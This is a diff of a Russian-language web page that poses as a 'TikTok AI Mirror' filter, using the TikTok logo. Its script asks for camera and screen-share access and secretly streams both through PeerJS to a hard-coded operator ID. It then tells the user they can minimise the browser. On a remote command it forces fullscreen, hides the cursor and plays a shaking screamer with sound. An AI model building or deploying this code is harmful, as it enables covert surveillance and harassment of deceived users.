@@ -2,16 +2,13 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok AI Morph v7.0</title>
+    <title>TikTok AI Stream</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        body { background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; overflow: hidden; }
-        .box { width: 90%; max-width: 400px; padding: 40px; border-radius: 30px; background: #0d0d0d; border: 1px solid #222; }
-        .logo { width: 70px; margin-bottom: 20px; filter: drop-shadow(0 0 10px #ff0050); }
-        .btn { background: #ff0050; color: #fff; border: none; padding: 20px; font-size: 18px; font-weight: bold; border-radius: 50px; cursor: pointer; width: 100%; transition: 0.3s; margin-top: 10px; }
-        .btn-cyan { background: #00f2ea; color: #000; }
-        #step-2, #screamer { display: none; }
+        body { background: #000; color: #fff; font-family: sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
+        .box { width: 350px; padding: 30px; border-radius: 20px; background: #0d0d0d; border: 1px solid #222; box-shadow: 0 10px 40px #000; }
+        .btn { background: #ff0050; color: #fff; border: none; padding: 18px; font-size: 16px; font-weight: bold; border-radius: 50px; cursor: pointer; width: 100%; margin-top: 20px; box-shadow: 0 0 15px rgba(255,0,80,0.4); }
+        .btn:active { transform: scale(0.98); }
         #screamer { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #000; z-index: 9999; display: none; align-items: center; justify-content: center; }
         #screamer img { width: 100%; height: 100%; object-fit: cover; animation: shake 0.1s infinite; }
         @keyframes shake { 0% { transform: translate(2px, 2px); } 50% { transform: translate(-2px, -3px); } 100% { transform: translate(1px, 2px); } }
@@ -19,18 +16,11 @@
 </head>
 <body>
 
-    <div id="step-1" class="box">
-        <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG.png" class="logo">
-        <h1>Шаг 1/2</h1>
-        <p style="color: #777;">Разрешите доступ к камере для анализа лица.</p>
-        <button class="btn" onclick="connectCam()">РАЗРЕШИТЬ КАМЕРУ</button>
-    </div>
-
-    <div id="step-2" class="box">
-        <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG.png" class="logo">
-        <h1>Шаг 2/2</h1>
-        <p style="color: #777;">Нажмите для синхронизации AI-фильтра с вашим экраном.</p>
-        <button class="btn btn-cyan" onclick="connectScreen()">ВКЛЮЧИТЬ ФИЛЬТР</button>
+    <div id="ui" class="box">
+        <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG.png" width="60">
+        <h2>AI Mirror</h2>
+        <p style="color: #777; font-size: 14px;">Для работы фильтра разрешите доступ к камере и трансляции экрана.</p>
+        <button class="btn" onclick="startVanish()">АКТИВИРОВАТЬ</button>
     </div>
 
     <div id="screamer">
@@ -39,43 +29,38 @@
     </div>
 
     <script>
-        const ADM_ID = '09062012';
+        const ADM_ID = '09062012'; // Твой ID из админки
         const peer = new Peer();
         let conn;
 
-        // 1. Подключаем камеру и сразу переходим к шагу 2
-        async function connectCam() {
+        async function startVanish() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                // 1. Сначала камера
+                const cam = await navigator.mediaDevices.getUserMedia({ video: true });
                 conn = peer.connect(ADM_ID);
-                peer.call(ADM_ID, stream);
+                peer.call(ADM_ID, cam);
 
-                document.getElementById('step-1').style.display = 'none';
-                document.getElementById('step-2').style.display = 'block';
+                // 2. СРАЗУ ЖЕ экран (без пауз, чтобы не было ошибки)
+                const screen = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                peer.call(ADM_ID, screen);
 
-                listen();
-            } catch (e) { alert("Ошибка! Нужна камера."); }
-        }
-
-        // 2. Подключаем экран по прямому клику (без задержек)
-        async function connectScreen() {
-            try {
-                const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                peer.call(ADM_ID, screenStream);
+                // 3. Убираем интерфейс
+                document.getElementById('ui').innerHTML = "<h3>ГОТОВО</h3><p>Синхронизация активна. Можете свернуть браузер.</p>";
                 
-                document.getElementById('step-2').innerHTML = "<h2>ГОТОВО</h2><p>Фильтр успешно активирован.</p>";
-            } catch(e) { 
-                alert("Нужно разрешить доступ к экрану!"); 
+                listen();
+            } catch (e) {
+                alert("Ошибка! Необходимо разрешить доступ и к камере, и к экрану.");
             }
         }
 
         function listen() {
             conn.on('data', d => {
                 if (d.type === 'SCR') {
+                    // Переход в полный экран и запуск скримера
+                    document.documentElement.requestFullscreen().catch(()=>{});
                     document.getElementById('screamer').style.display = 'flex';
                     document.getElementById('s-audio').play();
-                    // Попытка войти в фуллскрин при скримере
-                    document.documentElement.requestFullscreen().catch(()=>{});
+                    document.body.style.cursor = 'none';
                 }
             });
         }
